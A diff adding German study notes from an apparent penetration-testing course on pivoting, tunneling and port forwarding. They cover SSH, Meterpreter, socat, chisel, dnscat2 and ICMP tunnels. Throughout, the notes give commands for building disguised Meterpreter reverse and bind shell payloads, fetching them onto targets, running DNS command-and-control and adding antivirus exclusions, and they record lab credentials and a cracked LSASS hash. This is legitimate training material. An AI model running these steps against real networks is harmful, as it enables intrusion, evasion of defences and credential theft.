@@ -1,0 +1,412 @@
+Pivoting, Tunneling, and Port Forwarding
+Introduction
+1. Introduction to Pivoting, Tunneling, and Port Forwarding:
+- Waehrend eines Pentests kommt die Situation oft auf, dass zwischen uns und einem PC ein andere PC liegt
+- Das erste was wir machen wenn wir Zugriff auf einen PC haben ist Privilegien zu pruefen, Network Verbindungen zu pruefen
+- Wenn mehr als einen Netzwerkadapter haben koennen wir diesen Nutzen um durch das Netzwerk zu bewegen
+- Pivoting wird meistens verwendet um auf isolierte Netze zuzugreifen
+- Tunneling kapselt Traffic in ein anderes Protokoll un leitet den Traffic durch diesen
+
+- Lateral Movement, Pivoting, and Tunneling Compared:
+	- Lateral Movement:
+		- Als Lateral Movement wird eine Technik beschrieben mit dem auf andere Hosts, Anwendungen und Services zugegriffen werden kann
+
+	- Pivoting:
+		- Das Nutzen von mehreren Hosts zur Ueberwindung von Netzgrenzen
+		- Dadurch ist es moeglich tiefer in das Netz einzudringen
+
+	- Tunneling:
+		- Wir koennen Daten mit verschiedenen Protokollen an ein anderen Hosts zu schicken
+
+2. The Networking Behind Pivoting:
+- IP Adressing & NICs:
+	- Jeder Computer der mit dem Netzwerk kommunizieren moechte muss eine IP Adresse haben
+	- Die Zuweisung einer IP-Adresse kann statisch oder dynamisch mittels DHCP erfolgen
+	- Die IP wird einer Network Interface Controller(NIC) zugewiesen
+
+- Routing:
+	- Eine Routing-Tabelle erhaelt Eintraege wie der Computer mit Traffic umzugehen hat
+	- Diese Routing-Tabelle kann mit netstat -r angezeigt werden
+
+- Protocols, Services & Ports:
+	- Viele Protokolle haben feste Ports zugeschrieben
+
+###################################################################################################
+Choosing The Dig Site & Starting Out Tunnels:
+1. Dynamic Port Forwarding with SSH and SOCKS Tunneling:
+- Port Forwarding in Context:
+	- Port Forwarding ist eine Technik um Kommunikation an andere Ports weiterzuleiten
+	- Verschiedene Protkolle koennen mit SSH oder SOCKS koennen verwendet werden um Traffic zuverkapseln 
+
+	- SSH Local Port Forwarding:
+		- Scanning the Pivot Target:
+			- Bit dem Befehl scannen wir 
+				- nmap -sT -p22,3306 10.129.202.64
+			- Wenn nur ein Port offen ist und der andere geschlossen kann auf den geschlossene durch den offenen zugegriffen werden
+				- ssh -L LOCALPORT:localhost:REMOTE_PORT User@IP
+			- Die Option -L gibt an, dass die Anfragen ueber den Port 1234 an localhost:3306 weiterleitet 
+			- Mit netstat koennen wir das Port Forwarding ueberpruefen
+				- netstat -antp | grep 1234
+			- Dies kann auch mit nmap geschehen
+				- nmap -v -sV -p1234 localhost
+			- Auch mehrere Ports koennen an den lokalen Host weitergeleitet werden
+				- ssh -L 1234:localhost:3306 8080:localhost:80 ubuntu@10.129.202.64
+
+	- Setting up to Pivot:
+		- In Linux kann mit ifconfig alle NICs ausgegeben werden
+		- Wenn wir hier einen NICs mit einem ganz anderen Netzwerk sehen koennen wir auf dem Angriffshost keinen Nmap Scan usw auf diesem Netzwerk durchfuehren
+		- Um auch das andere Netzwerk zu erreichen muessen wir dynamic port forwarding durchfuehren und die Paket an den anderen Host weiterzuleiten
+		- Wir koennen einen SOCKS Listener auf unserm Attack Host starten
+		- Ein SOCKS Client stellt die Verbindung zu einem SOCKS Server her 
+		- SOCKS werden verwendet um Firefalls usw zu umgehen
+		
+		- Enabling Dynamic Port Forwarding with SSH:
+				- ssh -D 9050 ubuntu@10.129.202.64
+			- Die Option -D erlaubt dynamic port forwarding
+			- Dann benoetigen wir ein Tool um Paket ueber den Port 9050 zu senden
+			- Ein Tool dafuer ist proxychains hiermit koennen wir mehrere Proxy nacheinander schalten und unsere IP Adresse verschleiern
+			- Proxychain verwendet meistens bei Anwendungen mit TCP Traffic verwendetn und wir mit SOCKS4/SOCKS5, TOR oder HTTP/HTTPS Proxys gehostet
+			- In /etc/proxychains.conf werden die Informationen gespeichert ueber das Ziel hier ist es
+				- socks 127.0.0.1 9050
+
+			- Using Nmap with Proxychains:
+				- proxychains nmap -v -sn 172.16.5.1-200
+				- Durch Proxychains koennen wir das Netzwerk mit Nmap hinter dem ersten Host erreichen
+
+			- Using Metasploit with Proxychains:
+				- Wir koennen ebenfalls Metasploit durch proxychains verwenden
+				- proxychains msfconsole
+
+Questions: 
+10.129.149.170
+User: ubuntu
+Password: HTB_@cademy_stdnt!
+1. 
+You have successfully captured credentials to an external facing Web Server. Connect to the target and list the network interfaces. How many network interfaces does the target web server have? (Including the loopback interface)
+	ssh ubuntu@10.129.149.170
+		ifconfig 
+			3
+
+2. Apply the concepts taught in this section to pivot to the internal network and use RDP (credentials: victor:pass@123) to take control of the Windows target on 172.16.5.19 Submit the contents of Flag.txt located on the Desktop.
+	ssh -D 9050 ubuntu@10.129.149.170
+	proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
+
+##################################################################################################
+2. Remote/Reserve Port Forwarding with SSH:
+- Wenn wir ein Ziel erreichen muessen wir sicherstellen das dieses Ziel uns auch erreichen kann
+- Wir muessen auf dem Host zwischem dem Ziel und dem Angriffshost definieren was mit dem Traffic gemacht werden muss
+
+- Zuerst muessen wir eine Windows Payloaf mit msfvenom erstellen
+	- msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InteralIPofPivotHost> -f exe -o backupscript.exe LPORT=8080
+
+- In Metasploit koennen wir den mutlihandler setzen
+	- msf6 > use exploit/multi/handler
+	- Wir muessen 3 Optionen setzen
+	- set payload windows/x64/meterpreter/reverse_https
+	- set lhost 0.0.0.0
+	- set lport 8000
+	- run
+
+- Transferring Payload to Pivot Host:
+	- scp backupscript.exe ubuntu@<ipAddressofTarget>:~/
+
+- Starting Python3 Webserver on Pivot Host:
+	- Ein Webserver starten indem sich die Payload befindet
+	- python3 -m http.server 8123
+
+- Downloading Payload from Windows Target:
+	- Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
+
+- Using SSH -R:
+	- Wir werden ssh -R verwenden um SSH remote port forwarding zu verwenden um den Listener auf den Ubuntu Server Port 8080 weiterzuleiten
+	- ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
+	- -vN um die Ausgabe ausfueherlicher zu machen und um nicht nach einer Login Shell zu fragen
+	- -R bedeutet, dass der Ubuntu Server auf dem  <targetIPaddress>:8080 zuhoert und alle eingehenden Verbindungen auf den Port 8080 schickt zu unserem Attack host
+
+##################################################################################################
+3. Meterpreter Tunneling & Port Forwarding:
+- Wenn wir einen Meterpreter Shell Zugang zu dem pivot Host haben und wir einen nmap Scan ausfuehren wollen koenenn wir die Meterpreter Session ausfuehren
+- Wir koennen eine Meterpreter Shell auf dem pivot Host erstellen der eine Shell auf dem Attack Host erstellt auf Port 8080
+	- msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080
+- Bevor wir den Payload auf den pivot Host kopieren koennen muesen wir noch einen multi/handler erstellen
+	- Metasploit: use exploit/multi/handler
+		- set lhost 0.0.0.0
+		- set lport 8080
+		- set payload linux/x64/meterpreter/reverse_tcp payload => linux/x64/meterpreter/reverse_tcp
+		- run
+- Dann kopieren wir den Payload auf den pivot Host und fuehren ihn aus
+- In der Meterpreter Session koennen wir ping_sweep ausfuehren, dieser sendet ICMP Pakete an alle Hosts
+	- run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/
+- Ping Sweep Linux Pivot Host:
+	- for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
+- Ping Sweep For Loop Using CMD:
+	- for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
+- Ping Sweep Using PowerShell:
+	- 1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}
+
+- Wenn ICMP Traffic geblockt wird koennen wir einen TCP Scan durchfuehren mit nmap
+
+- Wenn wir SSH nicht fuer Port Forwarding verwenden wollen koennen wir das Metasploit Post exploitation Module socks_proxy verwenden umeinen lokalen Proxy auf unserem Attack Host zu erstellen
+- msf6 > use auxiliary/server/socks_proxy
+	- set SRVPORT 9050
+	- set SRVHOST 0.0.0.0
+	- set version 4a
+	- run
+- Mit jobs koennen wir in Metasploit die Jobs anzeigen
+
+- Nachdem wir den SOCKS Server gestartet haben koennen wir proxychains konfigurieren um den Traffic umzurouten
+- in /etc/proxychains.conf koennen wir die Zeile socks4 127.0.0.1 9050 hinzufuegen
+- Wir koennen der Meterpreter Session mitteilen Routen zu einem Subnetz hinzuzufuegen
+	- msf6 > use post/multi/manage/autoroute
+	- set SESSION 1
+	- set SUBNET 172.16.5.0
+	- run
+
+- Wir koennen in der meterpreter session die Routen anzeigen mit
+	- run autoroute -p
+
+
+- Port Forwarding:
+	- Port Forwarding kann mit dem Meterpreter Modul portfwd umgesetzt werden
+	- Lokalen TCP Relay erstellen:
+		- meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19
+		- -l Attack Host Port 
+		- -p Opfer Port 
+		- -r Opfer IP
+
+- Jetzt koenen wir den Windows Host mit xfreerdp aufrufen:
+	- xfreerdp /v:localhost:3300 /u:victor /p:pass@123
+- Mit netstat -antp koennen wir alle Verbindungen des Hosts ansehen
+
+
+- Meterpreter Reverse Port Forwarding:
+	- Metasploit kann reverse port forwarding ausfuehren
+	- meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
+	- Der Befehl sendet alle Verbindungen auf Port 1234 auf dem Ubuntu Server an den Attack Host an den Port 8801 weiter
+
+##################################################################################################
+Playing Pong with Socat:
+1. Socat Redirection with a Reverse Shell:
+- Socat ist ein bidirektionales Relay Tool welches ein pipe socket zwischen 2 unabhaengigen Netzwerken herstellen kann ohne das ein SSH Tunnel verwendet wird
+- Es hoert einem Port auf einem Host zu und sendet die Daten an den anderen Host an den Port weiter
+- Wir koennen den Meterpreter Listener von davor oeffnen und auf dem Opfer Server socat starten
+
+- Starting Socat Listener:
+	- socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
+	- Socat wird auf dem Port 8080 zuhoeren und allen Traffic an den Angriffshost auf Port 80 senden
+	- Wir koennen eine Payload erstellen, dass sich mit dem socat Listener verbindet
+
+- Creating the Windows Payload:
+	- msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080
+	- Der Payload muss auf den Windows Host kopiert werden
+
+- Configuring & Starting the multi/handler:
+	- use exploit/multi/handler
+		- set payload windows/x64/meterpreter/reverse_https
+		- set lhost 0.0.0.0
+		- set lport 80
+		- run
+
+2. Socat Redirection with a Bind Shell:
+- Wir koennen ebnso einen Bind Shell mit Socat erstellen
+- Eine Reverse Shell verbindet sich vom Windows Server durch den Pivot Server mit dem Angriffs Host
+- Eine Bind Shell wird ein Listener auf dem Windows Server auf einem Port starten. Dann starten wir eine Socat Redirector auf dem Pivot Server welches auf eine Metapsploit Verbindung wartet und dann zum Windows Server weiterleitet
+
+- Creating the Windows Payload:
+	- msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupscript.exe LPORT=8443
+
+- Starting Socat Bind Shell Listener:
+	- Wir muessen eine socat bind shell listener auf Port 8080 oeffnen und die Pakete an den Windows Server auf Port 8443 weiterleitet
+	- socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
+
+- Configuring & Starting the Bind multi/handler:
+	- Wir koennen einen Metasploit bind handler starten um mit dem Socat Listener auf dem pivot Server auf Port 8080 zu verbinen
+	- use exploit/multi/handler
+		- set payload windows/x64/meterpreter/bind_tcp
+		- set RHOST 10.129.202.64 //Pivot Host IP
+		- set LPORT 8080
+		- run
+##################################################################################################
+Pivoting Arround Obstacles
+1. SSH for Windows: plink.exe
+- Plink kurz fuer PuTTY Link ist ein Windows Befehlszeilen SSH Tool
+- Plink kann dafuer verwendet werden um dynamic port forwarding zu erstellen und SOCKS Proxies
+
+- Getting to Know Plink:
+	- Auf dem Windows Attack Host koennen wir plink.exe in der Befehlszeile starten um den dynamic port forward zum pivot Server zu senden
+	- plink -D 9050 ubuntu@10.129.15.50
+	- Ein anderes Windows Tool ist Proxifier mit dem SOCKS Tunnel mit SSH Session erstelle werden koennen
+
+2. SSH Pivoting with sshuttle:
+- Sshuttle ist ein anderes Tool in Python geschrieben, dass die Konfiguration von Proxychains ueberfluessig macht
+- SSHuttle laeuft nur ueber SSH und arbeitet nicht mit anderen Optionen wie HTTPS/TOR Proxy Server
+- Wir koennen Pivot Server alsa pivot konfigurieren um allen Traffic an andere Netzwerke weiterzuleiten
+- Mit der Option -r verbinden wir uns auf die remote machine mit Usernamen und Passwort
+- sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v
+- Mit dem Befehl erstellt sshuttle ein Eintrag in iptables und leitet allen Traffic an das Netzwerk 172.16.5.0 durch den pivot Host
+- Wenn der sshuttle Befehl ausgefuehrt wurde koennen wir nmap auf dem anderen Netzwerk ausfuehren
+- nmap -v -sV -p3389 172.16.5.19 -A -Pn
+
+3. Web Server Pivoting with Rpivot:
+- Rpivot ist ein reverse SOCKS proxy tool welches in Ptrhon geschrieben worden ist fuer SOCKS tunneling
+- Rpivot bindet einen Rechner innerhalb eines Unternehmens an einen externen Server und den lokalen Port des Clients auf der Serverseite frei ist
+
+- Cloning rpivot:
+	- sudo git clone https://github.com/klsecservices/rpivot.git
+
+- Running server.py from the Attack Host:
+	- python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
+
+- Transfering rpivot to the Target:
+	- scp -r rpivot ubuntu@<IpaddressOfTarget>:/home/ubuntu/
+
+- Running client.py from Pivot Target:
+	- python2.7 client.py --server-ip 10.10.14.18 --server-port 9999
+
+- Browsing to the Target Webserver using Proxychains:
+	- proxychains firefox-esr 172.16.5.135:80
+
+4. Port Forwarding with Windows: Netsh:
+- Netsh ist ein Windows Befehlzeilen Tool welches helfen kann mit Netzwerkkonfiguration
+- Netsh kann folgendes Aufgaben loesen:
+	- Routen finden
+	- Firewall Konfiguration einsehen
+	- Proxies hinzufuegen
+	- Port Forwarding Rules hinzufuegen
+- Wir koennen netsh.exe verwenden um alle Daten an einen spezifischen Port weiterzuleiten
+
+- Using Netsh.exe to Port Forward:
+	- netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25
+
+- Verifying Port Forward:
+	- netsh.exe interface portproxy show v4tov4
+
+##################################################################################################
+Branching Out Out Tunnels
+1. DNS Tunneling with Dnscat2:
+- Dnscat2 ist ein Tunneling Tool welches das DNS Protokoll verwendet um Daten von einem zum anderen Host zu senden
+- Es verwendet die verschluesselten Command-&-Control Channels um Daten in einem TXT Record im DNS Protokoll zu versenden
+- Die meisten Firmen haben einen internen DNS Server
+- Mit dnscat2 die Adress Aufloesung wird von einem externen DNS Server angefragt
+- DNScat2 ist sehr hilfreich im Umgehen von Firewall Detections
+
+- Setting up & Using dnscat2:
+	- git clone https://github.com/iagox86/dnscat2.git
+
+- Starting the dnscat2 server:
+	- sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
+	- Nachdem der Server gestartet worden ist wird ein secret key zurueck gegeben, diesen muessen wir dem dnscat2 Clienten uebergeben damit die Daten verschluesselt verschicht werden koennen
+	- Wir koennen auch eine dnscat2-powershell ein auf PowerShell basierenden dnscat2 Clienten dafuer verwenden
+	
+- Cloning dnscat2-powershell to the Attack Host:
+		- git clone https://github.com/lukebaggett/dnscat2-powershell.git
+	- Wenn die dnscat2.ps1 Datei auf dem PC vorhanden ist koennen wir sie Importieren mit 
+		- Import-Module .\dnscat2.ps1
+	- Nachdem das Modul importiert worden ist kann der Tunnel gestartet werden
+		- Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd
+
+2. SOCKS5 Tunneling with Chisel:
+- Chisel ist ein TCP/UDP in GO geschriebenes Tunneling Tool wleches HTTP verwendet um Daten ueber SSH zu senden
+- Chisel kann einen Client-Server Tunnel Verbindung ueber eine Firewall hinweg verbinden
+
+- Setting up & Using Chisel:
+	- git clone https://github.com/jpillora/chisel.git
+		- cd chisel 
+		- go build
+	
+	- Danach muessen wir chisel auf den Pivot Host kopieren
+		- scp chisel ubuntu@10.129.202.64:~/
+
+	- Auf dem Pivot Host Chisel Server starten:
+		-  ./chisel server -v -p 1234 --socks5
+
+	- Auf dem Angriffshost mit Chisel Server verbinden:
+		- ./chisel client -v 10.129.202.64:1234 socks
+
+	- Proxychains anpassen auf socks5
+
+- Das ganze geht auch anders herum:
+	- Chisel Server auf dem Attack Host starten:
+		- sudo ./chisel server --reverse -v -p 1234 --socks5
+	- Chisel Client auf dem pivot Host starten:
+		- ./chisel client -v 10.10.14.17:1234 R:socks
+
+3. ICMP Tunneling with SOCKS:
+- ICMP Tunneling kapselt den Traffic in ein ICMP Paket in echo requests und responses
+- ICMP Tunneling funktioniert wenn ICMP von der Firewall zugelassen wird
+- Wir werden ein ptunnel-ng Tool verwenden um ein Tunnel zwischen dem Attack Host und dem pivot Host verbinden
+- Wir werden einen Server ptunnel-ng server auf dem pivot host starten und einen ptunnel-ng client auf dem Attack Host starten
+ 
+- Cloning Ptunnel-ng:
+	- git clone https://github.com/utoni/ptunnel-ng.git
+	- Den Ptunnel-ng mit Autogen.sh aufbauen:
+		- sudo ./autogen.sh 
+	- Ptunnel auf den pivot Host kopieren:
+		- scp -r ptunnel-ng ubuntu@10.129.202.64:~/
+
+	- ptunnel-ng Server starten:
+		- sudo ./ptunnel-ng -r10.129.202.64 -R22
+	- ptunnel-ng Client starten:
+		- sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22
+
+- Tunneling an SSH connection through an ICMP Tunnel:
+	- ssh -p2222 -lubuntu 127.0.0.1
+	- Enabling Dynamic Port Forwarding over SSH:
+		- ssh -D 9050 -p2222 -lubuntu 127.0.0.1
+
+##################################################################################################
+Double Pivots
+1. RDP and SOCKS Tunneling with SocksOverRDP:
+- Manchmal haben wir kein Linux Host sondern nur ein Windwos Host hierbei koennen wir ein Windows Tool namens SocksOverRDP verwenden
+- SocksOverRDP verwendet das Tool Dynamic Virtual CHannels(DVC) vom Remote Desktop Service Feature auf Windows
+- DVC ist verantwortlich um Pakete ueber eine RDP Verbindung zu tunneln
+- Wir koennen Proxifier als unseren Proxy Server verwenden
+
+- Wir muessen die binaries downloaden und auf den Host pivot Host kopieren
+	- SocksOverRDP x64 Binaries
+		- https://github.com/nccgroup/SocksOverRDP/releases
+	- Proxifier Portable Binary
+		- https://www.proxifier.com/download/#win-tab
+- Wir koennen uns mit xfreerdp mit dem Ziel verbinden und die Daten rueberkopieren
+- regsvr32.exe SocksOverRDP-Plugin.dll auf dem pivot Host ausfuehren
+- Dann fuehren wir mstc.exe auf dem Pivot Host aus um uns mit dem Target Host zu verbinden
+
+
+- SocksOverRDPx64.zip runterladen
+- Auf dem Pivot Host eine Ausnahme fuer Ordner anlegen
+	- Start  > Settings  > Update & Security  > Windows Security > Virus & threat protection.
+	- Under Virus & threat protection settings, select Manage settings, and then under Exclusions, select Add or remove exclusions.
+- Auf den Windows pivot host kopieren
+- ProxifierPE.zip hertunerladen
+
+##################################################################################################
+Skills Assessment
+1. Skills Assessment:
+
+Attack Host: 
+	- msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080
+	- use exploit/multi/handler
+		- run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
+			- 172.16.5.35
+			- run autoroute -s 172.16.5.0/23
+
+		- proxychains xfreerdp /v:172.16.5.35 /u:mlefay /p:'Plain Human work!' /drive:/linux,/home/htb-ac-649986
+			- LSASS herunterladen und cracken
+			- 2e16a00be74fa0bf862b4256d0347e83 Hash von vfrank
+			- Password Imply wet Unmasked!
+	
+
+	- Connect to the next Host 172.16.6.25
+	- DC 172.16.10.5
+
+
+
+##################################################################################################
+Additional Considerations
+1. Detection & Prevention:
+- 
+
+
+2. Beyond this Module:
+- 
+
